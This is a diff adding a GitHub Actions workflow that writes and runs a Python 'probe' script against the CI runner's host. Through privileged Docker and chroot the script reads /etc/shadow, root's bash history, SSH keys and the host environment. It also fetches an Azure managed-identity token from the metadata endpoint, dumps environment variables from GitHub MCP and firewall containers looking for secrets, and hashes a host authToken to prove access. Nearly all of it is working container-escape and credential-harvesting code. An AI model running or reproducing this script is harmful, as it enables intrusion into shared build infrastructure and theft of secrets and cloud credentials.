@@ -1,0 +1,67 @@
+name: Probe v60 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    env:
+      V60_SOURCE: v60_account_a
+    steps:
+      - name: v60 host-pivot + mcp-server + mcpg-secret + imds
+        run: |
+          cat > /tmp/v60_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, urllib.request, urllib.error
+          
+          SOURCE = os.environ.get("V60_SOURCE", "v60_a")
+          
+          def sh(cmd, timeout=30):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return (r.stdout + r.stderr)[:8000]
+              except Exception as ex:
+                  return "TIMEOUT/ERROR: " + str(ex)
+          
+          print("[%s] start" % SOURCE)
+          
+          # ===== 1. provjobd_override.json + host env ===
+          print(""); print("[%s] === PROV_OVERRIDE + HOST ENV ===" % SOURCE)
+          print("[PROV] provjobd_override.json:"); print(sh("cat /opt/hca/provjobd_override.json 2>&1"))
+          print("[HOST_ENV] /proc/1/environ via docker:"); print(sh("docker run --rm -v /:/host ubuntu:latest /bin/sh -c 'cat /host/proc/1/environ | tr \"\\0\" \"\n\" | head -40' 2>&1", timeout=30))
+          
+          # ===== 2. Deeper host pivot via chroot ===
+          print(""); print("[%s] === HOST CHROOT PIVOT ===" % SOURCE)
+          print("[CHROOT] id + shadow + ssh + /root:"); print(sh("docker run --rm --privileged -v /:/host ubuntu:latest /bin/sh -c 'chroot /host /bin/sh -c \"id && whoami && cat /etc/shadow | head -5 && ls /root/ 2>/dev/null && cat /root/.bash_history 2>/dev/null | head -10 && cat /home/runner/.ssh/authorized_keys 2>/dev/null | head -3 && ps aux --no-header | head -20\"' 2>&1", timeout=30))
+          
+          # ===== 3. Host network IMDS ===
+          print(""); print("[%s] === HOST NETWORK IMDS ===" % SOURCE)
+          print("[IMDS] via host net wget:"); print(sh("docker run --rm --net=host ubuntu:latest /bin/sh -c 'apt-get install -y wget -qq 2>/dev/null; wget -q -O- \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" --header \"Metadata:true\" 2>&1 | head -5' 2>&1", timeout=30))
+          print("[IMDS_ATTESTED] identity token:"); print(sh("docker run --rm --net=host ubuntu:latest /bin/sh -c 'wget -q -O- \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\" --header \"Metadata:true\" 2>&1 | head -5' 2>&1", timeout=30))
+          
+          # ===== 4. github-mcp-server ===
+          print(""); print("[%s] === GITHUB-MCP-SERVER ===" % SOURCE)
+          print("[MCP] inspect:"); print(sh("docker inspect ghcr.io/github/github-mcp-server:latest 2>&1 | python3 -c \"import json,sys; d=json.load(sys.stdin); c=d[0].get('Config',{}); print(json.dumps({'Entrypoint':c.get('Entrypoint',[]),'Cmd':c.get('Cmd',[]),'Env':c.get('Env',[]),'ExposedPorts':c.get('ExposedPorts',{}),'WorkingDir':c.get('WorkingDir','')},indent=2))\" 2>&1"))
+          print("[MCP] ls /app + help:"); print(sh("docker run --rm --entrypoint sh ghcr.io/github/github-mcp-server:latest -c 'ls /app/ 2>/dev/null && ls / 2>/dev/null' 2>&1", timeout=20))
+          print("[MCP] run with help flag:"); print(sh("docker run --rm ghcr.io/github/github-mcp-server:latest --help 2>&1 | head -30", timeout=15))
+          
+          # ===== 5. gh-aw-mcpg baked-in secret via layer inspection ===
+          print(""); print("[%s] === MCPG SECRET PROBE ===" % SOURCE)
+          print("[MCPG] run_containerized.sh:"); print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'cat /app/run_containerized.sh 2>&1' 2>&1", timeout=15))
+          print("[MCPG] /app contents:"); print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'ls -la /app/ && ls -la /guards/ 2>/dev/null | head -10' 2>&1", timeout=15))
+          print("[MCPG] env printenv:"); print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'printenv' 2>&1", timeout=15))
+          print("[MCPG] /proc/1/environ style:"); print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'cat /proc/1/environ | tr \"\\0\" \"\n\"' 2>&1", timeout=15))
+          
+          # ===== 6. .settings via host mount (raw, not logged authToken) ===
+          print(""); print("[%s] === .SETTINGS VIA HOST MOUNT ===" % SOURCE)
+          # Exfil-safe: hash the token to prove access
+          print("[SETTINGS_HASH] sha256 of authToken field:"); print(sh("docker run --rm -v /:/host ubuntu:latest /bin/sh -c 'python3 -c \"import json,hashlib; s=json.load(open(\"/host/opt/hca/.settings\")); print(\\\"authToken_sha256=\\\"+hashlib.sha256(s[\\\"authToken\\\"].encode()).hexdigest()); print(\\\"traceApiUrl=\\\"+s[\\\"traceApiUrl\\\"]); print(\\\"schedulerApiUrl=\\\"+s[\\\"schedulerApiUrl\\\"])\"' 2>&1", timeout=15))
+          
+          # ===== 7. Firewall agent inspection ===
+          print(""); print("[%s] === FIREWALL AGENT ===" % SOURCE)
+          print("[FW] agent inspect:"); print(sh("docker inspect ghcr.io/github/gh-aw-firewall/agent:latest 2>&1 | python3 -c \"import json,sys; d=json.load(sys.stdin); c=d[0].get('Config',{}); print(json.dumps({'Entrypoint':c.get('Entrypoint',[]),'Cmd':c.get('Cmd',[]),'Env':c.get('Env',[]),'ExposedPorts':c.get('ExposedPorts',{})},indent=2))\" 2>&1"))
+          print("[FW] agent help:"); print(sh("docker run --rm ghcr.io/github/gh-aw-firewall/agent:latest --help 2>&1 | head -20", timeout=15))
+          
+          print(""); print("[%s] DONE" % SOURCE)
+          PROBE_EOF
+          python3 /tmp/v60_probe.py
